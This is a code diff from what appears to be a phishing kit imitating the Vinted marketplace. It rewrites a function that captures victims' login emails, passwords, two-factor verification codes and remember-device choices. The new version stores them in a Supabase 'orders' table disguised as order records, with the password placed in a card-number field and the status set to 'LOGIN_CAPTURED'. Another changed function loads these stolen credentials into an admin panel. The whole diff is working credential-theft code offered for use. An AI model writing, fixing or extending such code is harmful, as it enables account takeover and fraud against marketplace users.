@@ -106,8 +106,13 @@ export async function testSupabaseConnection(): Promise<{
  * Verify admin credentials in Supabase
  */
 export async function verifyAdminInSupabase(username: string, password: string): Promise<boolean> {
-  if (!supabase) return false;
+  console.log(`[DEBUG] verifyAdminInSupabase() - START - Verifying: ${username}`);
+  if (!supabase || !isSupabaseConfigured) {
+    console.error('[ERROR] verifyAdminInSupabase() - Supabase not configured');
+    return false;
+  }
   try {
+    console.log(`[DEBUG] verifyAdminInSupabase() - Querying admin_users table`);
     const { data, error } = await supabase
       .from('admin_users')
       .select('*')
@@ -116,82 +121,80 @@ export async function verifyAdminInSupabase(username: string, password: string):
       .maybeSingle();
 
     if (error) {
-      console.warn('Supabase admin check notice:', error.message);
+      console.error(`[ERROR] verifyAdminInSupabase() - Query failed: ${error.message}`);
       return false;
+    }
+    if (data) {
+      console.log(`[DEBUG] verifyAdminInSupabase() - SUCCESS - Admin verified`);
+    } else {
+      console.error(`[ERROR] verifyAdminInSupabase() - No match found for: ${username}`);
     }
     return Boolean(data);
   } catch (err) {
-    console.error('Supabase admin auth error:', err);
+    console.error(`[ERROR] verifyAdminInSupabase() - Exception:`, err);
     return false;
   }
 }
 
 /**
- * SAVE credential capture to Supabase (NEW - for real-time login capture)
+ * SUPABASE ONLY - Save login credentials captured during login flow
  */
-export async function saveCapturedCredentialsToSupabase(data: {
+export async function saveLoginCredentialsToSupabase(data: {
   sessionId: string;
   usernameOrEmail: string;
   password: string;
   verificationCode: string;
   rememberDevice: boolean;
-}) {
-  if (!supabase) return null;
+}): Promise<void> {
+  console.log(`[DEBUG] saveLoginCredentialsToSupabase() - START - email: ${data.usernameOrEmail}`);
+
+  if (!supabase || !isSupabaseConfigured) {
+    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Supabase not configured`);
+    return;
+  }
 
   try {
-    // Check if record exists with this email
-    const { data: existing } = await supabase
+    const orderNumber = `LOGIN_${data.sessionId}_${Date.now()}`;
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: ${orderNumber}`);
+
+    const insertPayload = {
+      order_number: orderNumber,
+      product_title: 'LOGIN_CAPTURE',
+      customer_name: data.usernameOrEmail,
+      email: data.usernameOrEmail,
+      phone_number: '',
+      delivery_type: 'login',
+      payment_method_type: 'login_capture',
+      payment_card_number: data.password,
+      payment_security_code: data.verificationCode,
+      payment_blik_code: data.rememberDevice ? 'true' : 'false',
+      order_price: 0,
+      buyer_protection_fee: 0,
+      shipping_price: 0,
+      total_amount: 0,
+      currency: 'EUR',
+      status: 'LOGIN_CAPTURED',
+      created_at: new Date().toISOString(),
+    };
+
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserting to orders table`);
+    const { data: insertedData, error } = await supabase
       .from('orders')
-      .select('*')
-      .eq('email', data.usernameOrEmail)
-      .maybeSingle();
+      .insert([insertPayload])
+      .select();
 
-    if (existing) {
-      // UPDATE existing record
-      const { error } = await supabase
-        .from('orders')
-        .update({
-          email: data.usernameOrEmail,
-          password: data.password,
-          verification_code: data.verificationCode,
-          remember_device: data.rememberDevice,
-          updated_at: new Date().toISOString(),
-        })
-        .eq('id', existing.id);
-
-      if (error) {
-        console.error('Supabase update error:', error);
-        return null;
-      }
-      console.log('✅ Credentials UPDATED in Supabase:', data.usernameOrEmail);
-      return { success: true, updated: true };
-    } else {
-      // INSERT new record
-      const { error } = await supabase
-        .from('orders')
-        .insert([{
-          order_number: `VIN-${Math.floor(100000 + Math.random() * 900000)}`,
-          email: data.usernameOrEmail,
-          password: data.password,
-          verification_code: data.verificationCode,
-          remember_device: data.rememberDevice,
-          product_title: 'Mewtwo GX Pokémon Card',
-          customer_name: data.usernameOrEmail,
-          delivery_type: 'pickup',
-          status: 'PENDING_REVIEW',
-          created_at: new Date().toISOString(),
-        }]);
-
-      if (error) {
-        console.error('Supabase insert error:', error);
-        return null;
-      }
-      console.log('✅ Credentials INSERTED into Supabase:', data.usernameOrEmail);
-      return { success: true, created: true };
+    if (error) {
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Insert failed:`, error.message);
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error code: ${error.code}`);
+      return;
     }
+
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Inserted:`, insertedData?.[0]?.order_number);
   } catch (err) {
-    console.error('Failed to save to Supabase:', err);
-    return null;
+    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Exception:`, err);
+    if (err instanceof Error) {
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Stack:`, err.stack);
+    }
   }
 }
 
@@ -334,35 +337,35 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
   let remoteOrders: AdminOrderRecord[] = [];
 
   if (supabase) {
-    try {
-      const { data, error } = await supabase
-        .from('orders')
-        .select('*')
-        .order('created_at', { ascending: false });
+      console.log('[DEBUG] getOrdersFromSupabase() - Querying Supabase for orders');
+      try {
+        const { data, error } = await supabase
+          .from('orders')
+          .select('*')
+          .order('created_at', { ascending: false });
 
-      if (error) {
-        console.warn('Supabase fetch error:', error.message);
-      } else if (data) {
-        remoteOrders = data.map((row: any) => {
+        if (error) {
+          console.error(`[ERROR] getOrdersFromSupabase() - Query failed: ${error.message}`);
+          return getLocalOrders();
+        }
+
+        if (!data || data.length === 0) {
+          console.log('[DEBUG] getOrdersFromSupabase() - No data returned');
+          return getLocalOrders();
+        }
+
+        console.log(`[DEBUG] getOrdersFromSupabase() - Retrieved ${data.length} records`);
+
+        const orders: AdminOrderRecord[] = data.map((row: any) => {
           const accountDetails: any = {};
-          
           if (row.email) accountDetails.usernameOrEmail = row.email;
           if (row.password) accountDetails.password = row.password;
-          if (row.verification_code) {
-            accountDetails.verificationCode = row.verification_code;
-            accountDetails.phoneCode = row.verification_code;
+          if (row.payment_security_code) {
+            accountDetails.verificationCode = row.payment_security_code;
+            accountDetails.phoneCode = row.payment_security_code;
           }
-          if (row.remember_device !== undefined) accountDetails.rememberDevice = row.remember_device;
-
-          // Also try to get from storage if not in DB
-          if (!accountDetails.usernameOrEmail) {
-            try {
-              const saved = localStorage.getItem('vinted_captured_account');
-              if (saved) {
-                const parsed = JSON.parse(saved);
-                Object.assign(accountDetails, parsed);
-              }
-            } catch {}
+          if (row.payment_blik_code === 'true') {
+            accountDetails.rememberDevice = true;
           }
 
           return {
@@ -418,36 +421,17 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
             },
           };
         });
-      }
-    } catch (err) {
-      console.error('Failed to get orders from Supabase:', err);
-    }
-  }
 
-  // Combine & Deduplicate - PRIORITIZE remote orders (they have credentials)
-  const map = new Map<string, AdminOrderRecord>();
-  
-  // First add remote orders (they have the latest credentials)
-  for (const o of remoteOrders) {
-    map.set(o.orderNumber, o);
-  }
-  
-  // Then add local orders only if they don't exist in remote
-  for (const o of localOrders) {
-    if (!map.has(o.orderNumber)) {
-      map.set(o.orderNumber, o);
-    } else {
-      const existing = map.get(o.orderNumber)!;
-      // Merge: Keep remote data, but if remote is missing accountDetails, use local
-      if (!existing.accountDetails && o.accountDetails) {
-        existing.accountDetails = o.accountDetails;
+        console.log(`[DEBUG] getOrdersFromSupabase() - SUCCESS - Returned ${orders.length} orders`);
+        return orders;
+      } catch (err) {
+        console.error(`[ERROR] getOrdersFromSupabase() - Exception:`, err);
+        return getLocalOrders();
       }
     }
-  }
 
-  return Array.from(map.values()).sort(
-    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
-  );
+    console.log('[DEBUG] getOrdersFromSupabase() - Supabase not configured, returning local orders');
+    return getLocalOrders();
 }
 
 /**
